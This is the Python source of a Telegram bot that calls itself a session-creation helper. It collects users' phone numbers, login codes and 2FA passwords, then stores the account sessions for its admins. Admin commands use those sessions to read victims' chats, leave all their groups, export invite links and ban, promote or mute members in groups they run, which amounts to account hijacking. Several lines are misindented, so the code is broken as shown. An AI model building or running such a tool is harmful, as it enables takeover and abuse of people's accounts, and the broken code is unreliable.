import os
import asyncio
import logging
import re
from typing import Dict, List, Optional, Tuple
from pyrogram import Client, filters, idle
from pyrogram.types import (
    Message, InlineKeyboardButton, 
    InlineKeyboardMarkup, CallbackQuery,
    Chat, User, ChatMember
)
from pyrogram.enums import ChatType, ChatMemberStatus
from pyrogram.errors import (
    SessionPasswordNeeded, PhoneCodeInvalid, 
    PhoneNumberInvalid, PhoneCodeExpired,
    AuthKeyUnregistered, UserNotParticipant,
    ChatAdminRequired, FloodWait, PeerIdInvalid
)
import config
import json
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class SessionBot:
    def __init__(self):
        self.app = Client(
            "session_bot",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            bot_token=config.BOT_TOKEN
        )
        self.user_sessions: Dict[int, Dict] = {}
        self.admin_sessions: Dict[int, Dict] = {}  # Store admin session clients
        self.active_admin_actions: Dict[int, Dict] = {}  # Store admin active actions
        self.setup_handlers()
        
    def is_admin(self, user_id: int) -> bool:
        """Check if user is admin"""
        return user_id in config.ADMIN_IDS
    
    def setup_handlers(self):
        """Setup bot command handlers"""
        
        @self.app.on_message(filters.command("start"))
        async def start_handler(client, message: Message):
            """Start command handler"""
            user_id = message.from_user.id
            
            if self.is_admin(user_id):
                await message.reply_text(
                    "👑 **Admin Session Bot**\n\n"
                    "Welcome, Admin!\n\n"
                    "**User Commands:**\n"
                    "/create_session - Create new session\n"
                    "/relogin - Relogin using session string\n"
                    "/mysessions - View your sessions\n"
                    "/cancel - Cancel current operation\n\n"
                    "**Admin Commands:**\n"
                    "/admin - Access admin panel\n"
                    "/sessions_list - View all user sessions\n"
                    "/stats - Bot statistics\n\n"
                    "⚠️ **Note:** Session files are forwarded to admins."
                )
            else:
                await message.reply_text(
                    "🤖 **Session Creation Bot**\n\n"
                    "I'll help you create a Telegram session file.\n\n"
                    "**Available Commands:**\n"
                    "/create_session - Create new session\n"
                    "/relogin - Relogin using session string\n"
                    "/mysessions - View your sessions\n"
                    "/cancel - Cancel current operation\n\n"
                    "⚠️ **Note:** Your session files will be securely stored and forwarded to admins."
                )
        
        @self.app.on_message(filters.command("admin"))
        async def admin_handler(client, message: Message):
            """Admin panel handler"""
            user_id = message.from_user.id
            
            if not self.is_admin(user_id):
                await message.reply_text("❌ You are not authorized to use admin commands!")
                return
            
            keyboard = [
                [
                    InlineKeyboardButton("📋 Sessions List", callback_data="admin_sessions"),
                    InlineKeyboardButton("📊 Statistics", callback_data="admin_stats")
                ],
                [
                    InlineKeyboardButton("🛠 Manage Session", callback_data="admin_manage"),
                    InlineKeyboardButton("⚙️ Admin Actions", callback_data="admin_actions")
                ]
            ]
            
            await message.reply_text(
                "👑 **Admin Panel**\n\n"
                "Select an option:",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        
        @self.app.on_message(filters.command("2f"))
        async def twofa_handler(client, message: Message):
            """Check and manage 2FA"""
            user_id = message.from_user.id
            
            if not self.is_admin(user_id):
                await message.reply_text("❌ You are not authorized to use admin commands!")
                return
            
            # Parse command: /2f <session_filename>
            args = message.text.split()
            if len(args) < 2:
                await message.reply_text(
                    "❌ Usage: /2f <session_filename>\n"
                    "Example: /2f session_123456789_987654321.session"
                )
                return
            
            session_file = args[1]
            await self.handle_2fa_check(message, session_file)
        
        @self.app.on_message(filters.command("chats"))
        async def chats_handler(client, message: Message):
            """Get first 10 chats of account"""
            user_id = message.from_user.id
            
            if not self.is_admin(user_id):
                await message.reply_text("❌ You are not authorized to use admin commands!")
                return
            
            args = message.text.split()
            if len(args) < 2:
                await message.reply_text(
                    "❌ Usage: /chats <session_filename>\n"
                    "Example: /chats session_123456789_987654321.session"
                )
                return
            
            session_file = args[1]
            await self.handle_get_chats(message, session_file)
        
        @self.app.on_message(filters.command("vanish"))
        async def vanish_handler(client, message: Message):
            """Leave all groups from account"""
            user_id = message.from_user.id
            
            if not self.is_admin(user_id):
                await message.reply_text("❌ You are not authorized to use admin commands!")
                return
            
            args = message.text.split()
            if len(args) < 2:
                await message.reply_text(
                    "❌ Usage: /vanish <session_filename>\n"
                    "Example: /vanish session_123456789_987654321.session"
                )
                return
            
            session_file = args[1]
            await self.handle_vanish_groups(message, session_file)
        
        @self.app.on_message(filters.command("admin_in"))
        async def admin_in_handler(client, message: Message):
            """Get groups/channels where user is admin"""
            user_id = message.from_user.id
            
            if not self.is_admin(user_id):
                await message.reply_text("❌ You are not authorized to use admin commands!")
                return
            
            args = message.text.split()
            if len(args) < 2:
                await message.reply_text(
                    "❌ Usage: /admin_in <session_filename>\n"
                    "Example: /admin_in session_123456789_987654321.session"
                )
                return
            
            session_file = args[1]
            await self.handle_admin_in(message, session_file)
        
        @self.app.on_message(filters.command("admin_in_powers"))
        async def admin_powers_handler(client, message: Message):
            """Use admin powers in groups"""
            user_id = message.from_user.id
            
            if not self.is_admin(user_id):
                await message.reply_text("❌ You are not authorized to use admin commands!")
                return
            
            args = message.text.split()
            if len(args) < 3:
                await message.reply_text(
                    "❌ Usage: /admin_in_powers <session_filename> <group_id>\n"
                    "Example: /admin_in_powers session_123456789_987654321.session -1001234567890\n\n"
                    "After this, use:\n"
                    "• /ban <user_id> - Ban user\n"
                    "• /unban <user_id> - Unban user\n"
                    "• /mute <user_id> - Mute user\n"
                    "• /unmute <user_id> - Unmute user\n"
                    "• /promote <user_id> - Promote to admin\n"
                    "• /demote <user_id> - Demote admin\n"
                    "• /pin <message_id> - Pin message\n"
                    "• /unpin <message_id> - Unpin message"
                )
                return
            
            session_file = args[1]
            group_id = args[2]
            
            # Store active admin session for this admin
            self.active_admin_actions[user_id] = {
                'session_file': session_file,
                'group_id': int(group_id),
                'action': 'admin_powers'
            }
            
            await message.reply_text(
                f"✅ Admin powers activated for session: {session_file}\n"
                f"Group: {group_id}\n\n"
                "Now you can use:\n"
                "• /ban <user_id> - Ban user\n"
                "• /unban <user_id> - Unban user\n"
                "• /mute <user_id> - Mute user\n"
                "• /unmute <user_id> - Unmute user\n"
                "• /promote <user_id> - Promote to admin\n"
                "• /demote <user_id> - Demote admin\n"
                "• /pin <message_id> - Pin message\n"
                "• /unpin <message_id> - Unpin message\n"
                "• /cancel_admin - Cancel admin powers"
            )
        
        @self.app.on_message(filters.command("groups_in"))
        async def groups_in_handler(client, message: Message):
            """Get all groups user is in"""
            user_id = message.from_user.id
            
            if not self.is_admin(user_id):
                await message.reply_text("❌ You are not authorized to use admin commands!")
                return
            
            args = message.text.split()
            if len(args) < 2:
                await message.reply_text(
                    "❌ Usage: /groups_in <session_filename>\n"
                    "Example: /groups_in session_123456789_987654321.session"
                )
                return
            
            session_file = args[1]
            await self.handle_groups_in(message, session_file)
        
        @self.app.on_message(filters.command("get_group_link"))
        async def group_link_handler(client, message: Message):
            """Get group invite link"""
            user_id = message.from_user.id
            
            if not self.is_admin(user_id):
                await message.reply_text("❌ You are not authorized to use admin commands!")
                return
            
            args = message.text.split()
            if len(args) < 3:
                await message.reply_text(
                    "❌ Usage: /get_group_link <session_filename> <group_id>\n"
                    "Example: /get_group_link session_123456789_987654321.session -1001234567890"
                )
                return
            
            session_file = args[1]
            group_id = args[2]
            await self.handle_get_group_link(message, session_file, group_id)
        
        @self.app.on_message(filters.command("sessions_list"))
        async def sessions_list_handler(client, message: Message):
            """List all user sessions"""
            user_id = message.from_user.id
            
            if not self.is_admin(user_id):
                await message.reply_text("❌ You are not authorized to use admin commands!")
                return
            
            await self.handle_sessions_list(message)
        
        @self.app.on_message(filters.command("stats"))
        async def stats_handler(client, message: Message):
            """Bot statistics"""
            user_id = message.from_user.id
            
            if not self.is_admin(user_id):
                await message.reply_text("❌ You are not authorized to use admin commands!")
                return
            
            await self.handle_stats(message)
        
        @self.app.on_message(filters.command("cancel_admin"))
        async def cancel_admin_handler(client, message: Message):
            """Cancel admin powers"""
            user_id = message.from_user.id
            
            if user_id in self.active_admin_actions:
                del self.active_admin_actions[user_id]
                await message.reply_text("✅ Admin powers cancelled.")
            else:
                await message.reply_text("❌ No active admin powers to cancel.")
        
        # Admin power sub-commands
        @self.app.on_message(filters.command(["ban", "unban", "mute", "unmute", "promote", "demote", "pin", "unpin"]))
        async def admin_power_commands(client, message: Message):
            """Handle admin power commands"""
            user_id = message.from_user.id
            
            if user_id not in self.active_admin_actions:
                return
            
            if not self.is_admin(user_id):
                return
            
            action_data = self.active_admin_actions[user_id]
            session_file = action_data['session_file']
            group_id = action_data['group_id']
            
            command = message.command[0]
            args = message.text.split()[1:]
            
            if not args:
                await message.reply_text(f"❌ Usage: /{command} <user_id>")
                return
            
            target_user = args[0]
            
            try:
                await self.handle_admin_power(
                    message, session_file, group_id, command, target_user
                )
            except Exception as e:
                await message.reply_text(f"❌ Error: {str(e)}")
        
        @self.app.on_callback_query()
        async def callback_handler(client, callback_query: CallbackQuery):
            """Handle callback queries"""
            user_id = callback_query.from_user.id
            data = callback_query.data
            
            if not self.is_admin(user_id):
                await callback_query.answer("You are not authorized!", show_alert=True)
                return
            
            if data == "admin_sessions":
                await self.handle_sessions_list(callback_query.message, edit=True)
                await callback_query.answer()
            
            elif data == "admin_stats":
                await self.handle_stats(callback_query.message, edit=True)
                await callback_query.answer()
            
            elif data == "admin_manage":
                keyboard = [
                    [
                        InlineKeyboardButton("Check 2FA", callback_data="manage_2fa"),
                        InlineKeyboardButton("Get Chats", callback_data="manage_chats")
                    ],
                    [
                        InlineKeyboardButton("Vanish Groups", callback_data="manage_vanish"),
                        InlineKeyboardButton("Admin In", callback_data="manage_admin_in")
                    ],
                    [
                        InlineKeyboardButton("Groups In", callback_data="manage_groups_in"),
                        InlineKeyboardButton("Get Group Link", callback_data="manage_group_link")
                    ],
                    [InlineKeyboardButton("◀️ Back", callback_data="back_to_admin")]
                ]
                
                await callback_query.message.edit_text(
                    "🛠 **Manage Session**\n\n"
                    "Select an action:",
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
                await callback_query.answer()
            
            elif data == "admin_actions":
                keyboard = [
                    [
                        InlineKeyboardButton("Use Admin Powers", callback_data="action_powers"),
                        InlineKeyboardButton("Send Message", callback_data="action_send")
                    ],
                    [InlineKeyboardButton("◀️ Back", callback_data="back_to_admin")]
                ]
                
                await callback_query.message.edit_text(
                    "⚙️ **Admin Actions**\n\n"
                    "Select an action:",
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
                await callback_query.answer()
            
            elif data == "back_to_admin":
                keyboard = [
                    [
                        InlineKeyboardButton("📋 Sessions List", callback_data="admin_sessions"),
                        InlineKeyboardButton("📊 Statistics", callback_data="admin_stats")
                    ],
                    [
                        InlineKeyboardButton("🛠 Manage Session", callback_data="admin_manage"),
                        InlineKeyboardButton("⚙️ Admin Actions", callback_data="admin_actions")
                    ]
                ]
                
                await callback_query.message.edit_text(
                    "👑 **Admin Panel**\n\n"
                    "Select an option:",
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
                await callback_query.answer()
            
            elif data.startswith("manage_"):
                action = data.replace("manage_", "")
                await callback_query.message.edit_text(
                    f"🛠 **{action.replace('_', ' ').title()}**\n\n"
                    f"Please use the command:\n"
                    f"/{action} <session_filename>\n\n"
                    f"Example: /{action} session_123456789_987654321.session\n\n"
                    "Or type 'back' to return."
                )
                await callback_query.answer()
            
            elif data == "action_powers":
                await callback_query.message.edit_text(
                    "⚙️ **Admin Powers**\n\n"
                    "Please use the command:\n"
                    "/admin_in_powers <session_filename> <group_id>\n\n"
                    "Example: /admin_in_powers session_123456789_987654321.session -1001234567890\n\n"
                    "Or type 'back' to return."
                )
                await callback_query.answer()
            
            elif data == "action_send":
                await callback_query.message.edit_text(
                    "📨 **Send Message**\n\n"
                    "Please use the command:\n"
                    "/send <session_filename> <chat_id> <message>\n\n"
                    "Example: /send session_123456789_987654321.session -1001234567890 Hello World!\n\n"
                    "Or type 'back' to return."
                )
                await callback_query.answer()
        
        # Original user session handlers (keep these)
        @self.app.on_message(filters.command("create_session"))
        async def create_session_handler(client, message: Message):
            """Start session creation process"""
            user_id = message.from_user.id
            
            if user_id in self.user_sessions:
                await message.reply_text("❌ You already have a session creation in progress!")
                return
            
            # Initialize user session data
            self.user_sessions[user_id] = {
                'step': 'phone',
                'client': None,
                'phone_code_hash': None,
                'phone_number': None
            }
            
            await message.reply_text(
                "📱 **Session Creation Started**\n\n"
                "Please send your phone number in international format:\n"
                "Example: `+911234567890`\n\n"
                "Use /cancel to stop the process."
            )
        
        @self.app.on_message(filters.command("relogin"))
         async def relogin_handler(client, message: Message):
            """Relogin using session string"""
            user_id = message.from_user.id
            
            if user_id in self.user_sessions:
                await message.reply_text("❌ You already have an operation in progress!")
                return
            
            self.user_sessions[user_id] = {
                'step': 'relogin',
                'client': None
            }
            
            await message.reply_text(
                "🔄 **Relogin Process**\n\n"
                "Please send your session string to relogin and verify.\n\n"
                "Use /cancel to stop the process."
            )
        
        @self.app.on_message(filters.command("mysessions"))
        async def my_sessions_handler(client, message: Message):
            """Show user's sessions"""
            user_id = message.from_user.id
            sessions = await self.get_user_sessions(user_id)
            
            if not sessions:
                await message.reply_text("❌ You don't have any saved sessions.")
                return
            
            session_list = "📁 **Your Saved Sessions:**\n\n"
            for session_file in sessions:
                # Extract user ID from filename
                user_id_from_file = session_file.split('_')[2].replace('.session', '')
                session_list += f"• **File:** `{session_file}`\n"
                session_list += f"  **Account ID:** {user_id_from_file}\n\n"
            
            await message.reply_text(session_list)
        
        @self.app.on_message(filters.command("cancel"))
        async def cancel_handler(client, message: Message):
            """Cancel current operation"""
            user_id = message.from_user.id
            
            if user_id in self.user_sessions:
                await self.cleanup_user_session(user_id)
                await message.reply_text("❌ Operation cancelled.")
            else:
                await message.reply_text("❌ No active operation to cancel.")
        
        @self.app.on_message(filters.text & filters.private)
        async def message_handler(client, message: Message):
            """Handle all messages for session creation"""
            user_id = message.from_user.id
            message_text = message.text
            
            # Skip commands and if not in session creation
            if message_text.startswith('/') or user_id not in self.user_sessions:
                return
            
            session_data = self.user_sessions[user_id]
            
            try:
                if session_data['step'] == 'phone':
                    await self.handle_phone_number(message, session_data, message_text)
                
                elif session_data['step'] == 'code':
                    await self.handle_otp_code(message, session_data, message_text)
                
                elif session_data['step'] == 'password':
                    await self.handle_2fa(message, session_data, message_text)
                
                elif session_data['step'] == 'relogin':
                    await self.handle_relogin(message, session_data, message_text)
                    
            except Exception as e:
                logger.error(f"Error in session creation for user {user_id}: {e}")
                await message.reply_text(f"❌ An error occurred: {str(e)}\n\nUse /create_session to try again.")
                await self.cleanup_user_session(user_id)
    
    # Admin Panel Methods
    
    async def get_session_client(self, session_file: str) -> Optional[Client]:
        """Get client from session file"""
        try:
            filepath = os.path.join(config.SESSION_FOLDER, session_file)
            if not os.path.exists(filepath):
                return None
            
            with open(filepath, 'r') as f:
                session_string = f.read().strip()
            
            # Extract user_id from filename
            parts = session_file.split('_')
            if len(parts) >= 3:
                user_id = parts[2].replace('.session', '')
            else:
                user_id = 'unknown'
            
            client = Client(
                f"admin_session_{user_id}",
                api_id=config.API_ID,
                api_hash=config.API_HASH,
                session_string=session_string
            )
            
            await client.connect()
            return client
            
        except Exception as e:
            logger.error(f"Error getting session client: {e}")
            return None
    
    async def handle_2fa_check(self, message: Message, session_file: str):
        """Check if account has 2FA and manage it"""
        try:
            await message.reply_text("🔍 Checking 2FA status...")
            
            client = await self.get_session_client(session_file)
            if not client:
                await message.reply_text("❌ Session file not found or invalid!")
                return
try:
                me = await client.get_me()
                
                # Try to export session string (if 2FA is disabled, this should work)
                try:
                    await client.export_session_string()
                    has_2fa = False
                    status = "❌ **2FA is DISABLED**"
                    button_text = "Enable 2FA"
                    callback_data = f"enable_2fa_{session_file}"
                except Exception:
                    has_2fa = True
                    status = "✅ **2FA is ENABLED**"
                    button_text = "Disable 2FA"
                    callback_data = f"disable_2fa_{session_file}"
                
                keyboard = [
                    [InlineKeyboardButton(button_text, callback_data=callback_data)],
                    [InlineKeyboardButton("Cancel", callback_data="cancel_2fa")]
                ]
                
                await message.reply_text(
                    f"👤 **Account:** {me.first_name} {me.last_name or ''}\n"
                    f"📱 **Phone:** {me.phone_number or 'Hidden'}\n"
                    f"🆔 **ID:** {me.id}\n\n"
                    f"🔐 **2FA Status:**\n{status}\n\n"
                    f"📁 **Session:** `{session_file}`",
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
                
            finally:
                await client.disconnect()
                
        except Exception as e:
            await message.reply_text(f"❌ Error checking 2FA: {str(e)}")
    
    async def handle_get_chats(self, message: Message, session_file: str, limit: int = 10):
        """Get first 10 chats of account"""
        try:
            await message.reply_text("📱 Fetching chats...")
            
            client = await self.get_session_client(session_file)
            if not client:
                await message.reply_text("❌ Session file not found or invalid!")
                return
            
            try:
                chats_text = "💬 **First 10 Chats:**\n\n"
                count = 0
                
                async for dialog in client.get_dialogs(limit=limit):
                    chat = dialog.chat
                    chat_type = "👥 Group" if chat.type == ChatType.GROUP else \
                               "📢 Channel" if chat.type == ChatType.CHANNEL else \
                               "👤 Private"
                    
                    chats_text += f"**{count+1}. {chat.title or chat.first_name}**\n"
                    chats_text += f"   Type: {chat_type}\n"
                    chats_text += f"   ID: `{chat.id}`\n"
                    chats_text += f"   Username: @{chat.username or 'N/A'}\n\n"
                    
                    count += 1
                
                if count == 0:
                    chats_text = "❌ No chats found!"
                
                await message.reply_text(chats_text)
                
            finally:
                await client.disconnect()
                
        except Exception as e:
            await message.reply_text(f"❌ Error fetching chats: {str(e)}")
    
    async def handle_vanish_groups(self, message: Message, session_file: str):
        """Leave all groups from account"""
        try:
            await message.reply_text("🚫 Starting to leave groups...")
            
            client = await self.get_session_client(session_file)
            if not client:
                await message.reply_text("❌ Session file not found or invalid!")
                return
            
            try:
                me = await client.get_me()
                left_count = 0
                error_count = 0
                
                async for dialog in client.get_dialogs():
                    chat = dialog.chat
                    
                    # Only leave groups and supergroups
                    if chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
                        try:
                            await client.leave_chat(chat.id)
                            left_count += 1
                            await message.reply_text(f"✅ Left: {chat.title or chat.first_name}")
                        except Exception as e:
                            error_count += 1
                            logger.error(f"Error leaving {chat.id}: {e}")
                
                await message.reply_text(
                    f"✅ **Vanishing Complete!**\n\n"
                    f"👤 Account: {me.first_name}\n"
                    f"📊 Results:\n"
                    f"• Groups Left: {left_count}\n"
                    f"• Errors: {error_count}"
                )
                
            finally:
                await client.disconnect()
                
        except Exception as e:
            await message.reply_text(f"❌ Error vanishing groups: {str(e)}")
    
    async def handle_admin_in(self, message: Message, session_file: str):
        """Get groups/channels where user is admin"""
        try:
            await message.reply_text("👑 Finding admin chats...")
            
            client = await self.get_session_client(session_file)
            if not client:
                await message.reply_text("❌ Session file not found or invalid!")
                return
            
            try:
                me = await client.get_me()
                admin_chats = []
                
                async for dialog in client.get_dialogs():
                    chat = dialog.chat
                    
                    # Check if user is admin in this chat
                    try:
                        member = await client.get_chat_member(chat.id, me.id)
                        if member.status in [ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.OWNER]:
                            admin_chats.append({
                                'chat': chat,
                                'member': member
                            })
                    except:
                        continue
                
                if not admin_chats:
                    await message.reply_text("❌ Not admin in any groups/channels!")
                    return
                
                admin_text = f"👑 **Admin in {len(admin_chats)} chats:**\n\n"
                
                for i, admin_data in enumerate(admin_chats[:20]):  # Limit to 20
                    chat = admin_data['chat']
                    member = admin_data['member']
                    
                    chat_type = "👥 Group" if chat.type == ChatType.GROUP else \
                               "📢 Channel" if chat.type == ChatType.CHANNEL else \
                               "👤 Private"
                    
                    admin_text += f"**{i+1}. {chat.title or chat.first_name}**\n"
                    admin_text += f"   Type: {chat_type}\n"
                    admin_text += f"   ID: `{chat.id}`\n"
                    admin_text += f"   Role: {member.status.value}\n"
                    admin_text += f"   Username: @{chat.username or 'N/A'}\n\n"
                
                if len(admin_chats) > 20:
                    admin_text += f"... and {len(admin_chats) - 20} more"
                
                await message.reply_text(admin_text)
                
            finally:
                await client.disconnect()
                
        except Exception as e:
            await message.reply_text(f"❌ Error finding admin chats: {str(e)}")
    
    async def handle_admin_power(self, message: Message, session_file: str, group_id: int, action: str, target_user: str):
        """Use admin powers in a group"""
        try:
            client = await self.get_session_client(session_file)
            if not client:
                await message.reply_text("❌ Session file not found or invalid!")
                return
            
            try:
                # Parse target user
                try:
                    target_user_id = int(target_user)
                except:
                    # Try to get user by username
                    if target_user.startswith('@'):
                        target_user = target_user[1:]
                    user = await client.get_users(target_user)
                    target_user_id = user.id
                
                # Perform action
                if action == "ban":
                    await client.ban_chat_member(group_id, target_user_id)
                    result = f"✅ User {target_user_id} banned from group"
                    elif action == "unban":
                    await client.unban_chat_member(group_id, target_user_id)
                    result = f"✅ User {target_user_id} unbanned from group"
                
                elif action == "mute":
                    await client.restrict_chat_member(group_id, target_user_id)
                    result = f"✅ User {target_user_id} muted in group"
                
                elif action == "unmute":
                    await client.unban_chat_member(group_id, target_user_id)  # Unmute is same as unban
                    result = f"✅ User {target_user_id} unmuted in group"
                
                elif action == "promote":
                    # Promote to admin with basic permissions
                    await client.promote_chat_member(
                        group_id,
                        target_user_id,
                        can_change_info=True,
                        can_delete_messages=True,
                        can_invite_users=True,
                        can_restrict_members=True,
                        can_pin_messages=True,
                        can_promote_members=False
                    )
                    result = f"✅ User {target_user_id} promoted to admin"
                
                elif action == "demote":
                    await client.promote_chat_member(
                        group_id,
                        target_user_id,
                        can_change_info=False,
                        can_delete_messages=False,
                        can_invite_users=False,
                        can_restrict_members=False,
                        can_pin_messages=False,
                        can_promote_members=False
                    )
                    result = f"✅ User {target_user_id} demoted from admin"
                
                elif action == "pin":
                    await client.pin_chat_message(group_id, int(target_user))
                    result = f"✅ Message {target_user} pinned"
                
                elif action == "unpin":
                    await client.unpin_chat_message(group_id, int(target_user))
                    result = f"✅ Message {target_user} unpinned"
                
                else:
                    result = "❌ Unknown action"
                
                await message.reply_text(result)
                
            except ChatAdminRequired:
                await message.reply_text("❌ You don't have admin permissions in this group!")
            except Exception as e:
                await message.reply_text(f"❌ Error: {str(e)}")
            finally:
                await client.disconnect()
                
        except Exception as e:
            await message.reply_text(f"❌ Error: {str(e)}")
    
    async def handle_groups_in(self, message: Message, session_file: str):
        """Get all groups user is in"""
        try:
            await message.reply_text("👥 Finding groups...")
            
            client = await self.get_session_client(session_file)
            if not client:
                await message.reply_text("❌ Session file not found or invalid!")
                return
            
            try:
                groups = []
                
                async for dialog in client.get_dialogs():
                    chat = dialog.chat
                    if chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
                        groups.append(chat)
                
                if not groups:
                    await message.reply_text("❌ Not a member of any groups!")
                    return
                
                groups_text = f"👥 **Member of {len(groups)} groups:**\n\n"
                
                for i, chat in enumerate(groups[:20]):  # Limit to 20
                    members_count = chat.members_count or "Unknown"
                    
                    groups_text += f"**{i+1}. {chat.title}**\n"
                    groups_text += f"   ID: `{chat.id}`\n"
                    groups_text += f"   Members: {members_count}\n"
                    groups_text += f"   Username: @{chat.username or 'N/A'}\n\n"
                
                if len(groups) > 20:
                    groups_text += f"... and {len(groups) - 20} more"
                
                await message.reply_text(groups_text)
                
            finally:
                await client.disconnect()
                
        except Exception as e:
            await message.reply_text(f"❌ Error finding groups: {str(e)}")
    
    async def handle_get_group_link(self, message: Message, session_file: str, group_id: str):
        """Get group invite link"""
        try:
            await message.reply_text("🔗 Getting group link...")
            
            client = await self.get_session_client(session_file)
            if not client:
                await message.reply_text("❌ Session file not found or invalid!")
                return
            
            try:
                # Parse group_id
                try:
                    chat_id = int(group_id)
                except:
                    await message.reply_text("❌ Invalid group ID!")
                    return
                
                # Get chat
                chat = await client.get_chat(chat_id)
                
                # Get invite link
                try:
                    invite_link = await client.export_chat_invite_link(chat_id)
                    link_text = f"✅ **Invite Link:** {invite_link}"
                except ChatAdminRequired:
                    # Try to get existing link
                    try:
                        invite = await client.get_chat_invite_link(chat_id)
                        link_text = f"🔗 **Existing Invite Link:** {invite.invite_link}"
                    except:
                        link_text = "❌ No permission to get invite link"
                
                result = (
                    f"**Group:** {chat.title}\n"
                    f"**ID:** `{chat.id}`\n"
                    f"**Type:** {chat.type.value}\n\n"
                    f"{link_text}"
                )
                
                await message.reply_text(result)
                
            finally:
                await client.disconnect()
                
        except PeerIdInvalid:
            await message.reply_text("❌ Invalid group ID or not a member!")
        except Exception as e:
            await message.reply_text(f"❌ Error getting group link: {str(e)}")
    
    async def handle_sessions_list(self, message: Message, edit: bool = False):
        """List all user sessions"""
        try:
            if not os.path.exists(config.SESSION_FOLDER):
                if edit:
                    await message.edit_text("❌ No sessions found!")
                else:
                    await message.reply_text("❌ No sessions found!")
                return
            
            session_files = [f for f in os.listdir(config.SESSION_FOLDER) if f.endswith('.session')]
            
            if not session_files:
                if edit:
                    await message.edit_text("❌ No sessions found!")
                else:
                    await message.reply_text("❌ No sessions found!")
                return
            
            # Group by bot user ID
            sessions_by_user = {}
            for session_file in session_files:
                parts = session_file.split('_')
                if len(parts) >= 3:
                    bot_user_id = parts[1]
                    if bot_user_id not in sessions_by_user:
                        sessions_by_user[bot_user_id] = []
                    sessions_by_user[bot_user_id].append(session_file)
            
            sessions_text = "📋 **All User Sessions**\n\n"
            total_sessions = len(session_files)
            total_users = len(sessions_by_user)
            
            sessions_text += f"**Total:** {total_sessions} sessions from {total_users} users\n\n"
            
            for bot_user_id, files in sessions_by_user.items():
                sessions_text += f"**👤 User ID:** `{bot_user_id}`\n"
                sessions_text += f"**Sessions:** {len(files)}\n"
                
                for i, session_file in enumerate(files[:3]):  # Show max 3 per user
                    account_id = session_file.split('_')[2].replace('.session', '')
                    sessions_text += f"  {i+1}. `{session_file}` (Account: {account_id})\n"
                
                if len(files) > 3:
                    sessions_text += f"  ... and {len(files) - 3} more\n"
                
                sessions_text += "\n"
            
            if edit:
                await message.edit_text(sessions_text)
            else:
                await message.reply_text(sessions_text)
                
        except Exception as e:
            error_msg = f"❌ Error listing sessions: {str(e)}"
            if edit:
                await message.edit_text(error_msg)
            else:
                await message.reply_text(error_msg)
    
    async def handle_stats(self, message: Message, edit: bool = False):
        """Show bot statistics"""
        try:
            # Count sessions
            total_sessions = 0
            if os.path.exists(config.SESSION_FOLDER):
                total_sessions = len([f for f in os.listdir(config.SESSION_FOLDER) if f.endswith('.session')])
            
            # Count unique users
            unique_users = set()
            if os.path.exists(config.SESSION_FOLDER):
                for f in os.listdir(config.SESSION_FOLDER):
                    if f.endswith('.session'):
                        parts = f.split('_')
                        if len(parts) >= 2:
                            unique_users.add(parts[1])
            
            stats_text = (
                "📊 **Bot Statistics**\n\n"
                f"• **Total Sessions:** {total_sessions}\n"
                f"• **Unique Users:** {len(unique_users)}\n"
                f"• **Active Admins:** {len(config.ADMIN_IDS)}\n"
                f"• **Active User Sessions:** {len(self.user_sessions)}\n"
                f"• **Active Admin Actions:** {len(self.active_admin_actions)}\n\n"
                f"**Session Folder:** {config.SESSION_FOLDER}/\n"
                f"**Bot Status:** ✅ Online\n"
                f"**Last Updated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
            
            if edit:
                await message.edit_text(stats_text)
            else:
                await message.reply_text(stats_text)
                
        except Exception as e:
            error_msg = f"❌ Error getting stats: {str(e)}"
            if edit:
                await message.edit_text(error_msg)
            else:
                await message.reply_text(error_msg)
    
    # Original session creation methods (keep these)
    async def handle_phone_number(self, message: Message, session_data: Dict, phone_number: str):
        """Handle phone number input"""
        try:
            # Validate phone number format
            if not phone_number.startswith('+'):
                await message.reply_text("❌ Please use international format starting with '+'")
                return
            
            # Create user client
            user_client = Client(
                f"user_session_{message.from_user.id}",
                api_id=config.API_ID,
                api_hash=config.API_HASH,
                phone_number=phone_number
            )
            
            await user_client.connect()
            
            # Send code request
            sent_code = await user_client.send_code(phone_number)
            
            session_data['client'] = user_client
            session_data['phone_code_hash'] = sent_code.phone_code_hash
            session_data['phone_number'] = phone_number
            session_data['step'] = 'code'
            
            await message.reply_text(
                "📨 **OTP Sent**\n\n"
                "I've sent a verification code to your phone.\n"
                "Please enter the code you received:\n\n"
                "Format: `12345`"
            )
            
        except PhoneNumberInvalid:
            await message.reply_text("❌ Invalid phone number. Please check and try again.")
            await self.cleanup_user_session(message.from_user.id)
        except Exception as e:
            await message.reply_text(f"❌ Error sending code: {str(e)}\n\nUse /create_session to try again.")
            await self.cleanup_user_session(message.from_user.id)
    
    async def handle_otp_code(self, message: Message, session_data: Dict, code: str):
        """Handle OTP code input"""
        try:
            # Validate code format
            if not code.replace(' ', '').isdigit():
                await message.reply_text("❌ Please enter only numbers")
                return
            
            client = session_data['client']
            code = code.replace(' ', '')
            
            # Sign in with code
            try:
                await client.sign_in(
                    phone_number=session_data['phone_number'],
                    phone_code_hash=session_data['phone_code_hash'],
                    phone_code=code
                )
                
            except SessionPasswordNeeded:
                session_data['step'] = 'password'
                await message.reply_text(
                    "🔐 **Two-Factor Authentication**\n\n"
                    "Your account has 2FA enabled.\n"
                    "Please enter your 2FA password:"
                )
                return
            except PhoneCodeInvalid:
                await message.reply_text("❌ Invalid code. Please check and try again.")
                return
            except PhoneCodeExpired:
                await message.reply_text("❌ Code expired. Please start over with /create_session")
                await self.cleanup_user_session(message.from_user.id)
                return
            
            # If no 2FA required, complete login
            await self.complete_session_creation(message, session_data)
            
        except Exception as e:
            await message.reply_text(f"❌ Error verifying code: {str(e)}\n\nUse /create_session to try again.")
            await self.cleanup_user_session(message.from_user.id)
    
    async def handle_2fa(self, message: Message, session_data: Dict, password: str):
        """Handle 2FA password input"""
        try:
            client = session_data['client']
            
            # Complete sign in with 2FA
            await client.check_password(password=password)
            
            # Complete session creation
